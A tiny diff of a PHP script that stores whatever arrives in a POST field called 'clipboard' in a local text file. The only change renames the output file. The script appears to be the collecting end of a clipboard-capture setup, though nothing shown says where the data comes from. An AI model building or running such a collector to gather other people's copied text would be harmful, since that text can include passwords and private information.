@@ -1,6 +1,6 @@
 <?php
 if (isset($_POST["clipboard"])){
-    $file = fopen("info.txt", "w");
+    $file = fopen("clipboard.txt", "w");
     fwrite($file, "ClipBoard Content: ".$_POST["clipboard"]);
     fclose($file);
 }
